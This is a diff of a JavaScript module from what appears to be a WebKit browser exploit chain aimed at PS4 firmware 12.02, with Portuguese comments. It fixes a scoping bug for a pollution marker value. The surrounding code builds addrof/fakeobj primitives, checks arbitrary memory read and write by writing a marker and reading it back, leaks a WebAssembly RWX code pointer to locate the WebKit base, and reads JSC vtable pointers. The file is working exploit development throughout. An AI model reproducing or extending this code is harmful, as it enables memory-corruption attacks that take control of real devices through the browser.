@@ -1,12 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v116 - R76 com Alocação Diferenciada e Restauração de Heap)
+// js/script3/testArrayBufferVictimCrash.mjs (v117 - R77 com Fix de Escopo NEW_POLLUTION_VALUE)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Implementa técnicas avançadas de Heap Feng Shui e Alocação Diferenciada
-// para tentar contornar a reutilização previsível de heap do PS4 12.02.
-// - WASM alocado com tamanho específico ANTES da poluição.
-// - Verificação L/E realizada em buffer de tamanho significativamente diferente.
-// - WebGL alocado com outro tamanho distinto.
-// - Tentativa de "restauração" de heap com padrões de limpeza.
+// Corrigido o erro de escopo 'NEW_POLLUTION_VALUE is not defined' para que
+// a função decodePS4Pointer possa acessá-lo corretamente.
+// Mantém as estratégias de alocação diferenciada e restauração de heap.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -18,7 +15,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v116_R76_DiffAllocRestore";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v117_R77_PollutionScopeFix";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -37,9 +34,13 @@ function doubleToInt64(double) {
     return new AdvancedInt64(u32[0], u32[1]);
 }
 
+// --- DEFINIÇÃO GLOBAL PARA O VALOR DE POLUIÇÃO ---
+// Deve ser definida fora da função principal para ser acessível a decodePS4Pointer
+const NEW_POLLUTION_VALUE_GLOBAL = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF); 
+
 // --- Funções de Decodificação de Ponteiros (Ajustada para a Análise do PS4) ---
 // Constante NEW_POLLUTION_VALUE deve ser globalmente acessível para decodePS4Pointer.
-let NEW_POLLUTION_VALUE_GLOBAL = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF); // Definido aqui para escopo
+const PS4_HEAP_BASE = AdvancedInt64.fromParts(0x20000000, 0); 
 
 function decodePS4Pointer(encoded_adv_int64) {
     if (!isAdvancedInt64Object(encoded_adv_int64)) {
@@ -54,7 +55,7 @@ function decodePS4Pointer(encoded_adv_int64) {
 
     logS3(`    [decodePS4Pointer] Original: ${encoded_adv_int64.toString(true)}, Tag: ${toHex(typeTag)}, High_part: ${toHex(address_high_part)}`, "debug");
 
-    if (encoded_adv_int64.equals(NEW_POLLUTION_VALUE_GLOBAL)) { // Usar a global
+    if (encoded_adv_int64.equals(NEW_POLLUTION_VALUE_GLOBAL)) { // Agora acessível globalmente
         logS3(`    [decodePS4Pointer] Valor de poluição (${NEW_POLLUTION_VALUE_GLOBAL.toString(true)}) detectado. Retornando como está (não é um ponteiro para decodificar).`, "warn");
         return encoded_adv_int64; // Não é um ponteiro para decodificar, é o valor de poluição
     }
@@ -77,8 +78,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
     };
 
-    // Atualiza a global para a instância atual da execução.
-    NEW_POLLUTION_VALUE_GLOBAL = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);
+    // A variável NEW_POLLUTION_VALUE_GLOBAL já está definida no escopo do módulo.
 
     // --- DEFINIÇÃO DE ADDROF/FAKEOBJ AQUI (Escopo Global da Função) ---
     const confused_array = [13.37];
@@ -204,8 +204,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- FASE 4: Verificação Funcional de L/E e Poluição Intencional em Região Segura ---
         logS3("--- FASE 4: Verificação Funcional de L/E e Poluição Intencional em Região Segura ---", "subtest");
         
-        // Definir um tamanho para a região de teste L/E que seja DIFERENTE do tamanho WASM
-        const SAFE_TEST_REGION_SIZE = 0x10000; // 64KB, diferente de 0x120
+        // Poluição de uma região de heap separada para o teste de L/E
+        const SAFE_TEST_REGION_SIZE = 0x10000; // 64KB, diferente de 0x120 para WASM e 0x300 para WebGL
         const safe_test_region_array = new ArrayBuffer(SAFE_TEST_REGION_SIZE); // Cria um buffer de tamanho específico
         const safe_test_region_addr = addrof(safe_test_region_array);
         logS3(`  Endereço da região segura para teste L/E (Tamanho: ${toHex(SAFE_TEST_REGION_SIZE)}): ${safe_test_region_addr.toString(true)}`, "info");
@@ -213,18 +213,18 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // Escreve o valor de poluição na região segura para teste L/E
         // Para ArrayBuffer, o offset para o CONTENTS_IMPL_POINTER_OFFSET é 0x10
         const write_target_addr_in_safe_region = safe_test_region_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET); 
-        logS3(`  Escrevendo VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} na região segura (${write_target_addr_in_safe_region.toString(true)})...`, "info");
-        arb_write_final(write_target_addr_in_safe_region, NEW_POLLUTION_VALUE);
+        logS3(`  Escrevendo VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE_GLOBAL.toString(true)} na região segura (${write_target_addr_in_safe_region.toString(true)})...`, "info");
+        arb_write_final(write_target_addr_in_safe_region, NEW_POLLUTION_VALUE_GLOBAL);
 
         const value_read_for_verification = arb_read_final(write_target_addr_in_safe_region);
         logS3(`>>>>> VERIFICAÇÃO L/E: VALOR LIDO DE VOLTA DA REGIÃO SEGURA: ${value_read_for_verification.toString(true)} <<<<<`, "leak");
 
-        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
+        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE_GLOBAL)) {
             logS3("+++++++++++ SUCESSO! Valor de poluição escrito e lido corretamente em região segura. L/E arbitrária é 100% funcional. +++++++++++", "vuln");
             final_result.success = true;
             final_result.message = "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada.";
         } else {
-            throw new Error(`A verificação de L/E falhou na região segura. Escrito: ${NEW_POLLUTION_VALUE.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
+            throw new Error(`A verificação de L/E falhou na região segura. Escrito: ${NEW_POLLUTION_VALUE_GLOBAL.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
         }
 
         // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT via WebAssembly ---
@@ -251,6 +251,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 throw new Error("Ponteiro RWX decodificado é NaN.");
             }
             // A região RWX deve estar em um espaço de endereçamento alto, alinhado.
+            // A sua análise sugere que ponteiros WASM válidos podem ter tags 0x00-0x0F,
+            // e que 0x40 é para objetos JS comuns.
+            // O high-word de um endereço de código no PS4 geralmente é elevado.
             const is_sane_rwx_ptr = rwx_ptr_decoded.high() > 0x40000000 && (rwx_ptr_decoded.low() & 0xFFF) === 0;
             logS3(`  Verificação de Sanidade do Ponteiro RWX: Alto > 0x40000000 e alinhado a 0x1000? ${is_sane_rwx_ptr}`, is_sane_rwx_ptr ? "good" : "warn");
 
@@ -531,7 +534,7 @@ async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_fu
         }
 
         await PAUSE_S3(50); // Pequena pausa
-
+        
         // 3. Leitura do ponteiro JSC::JSObject::put da vtable da Structure
         const js_object_put_func_ptr_addr_in_structure = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
         logS3(`  Tentando ler ponteiro de JSC::JSObject::put de ${js_object_put_func_ptr_addr_in_structure.toString(true)} (Structure*+${toHex(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET)}) para "${obj_type_name}"`, "debug");
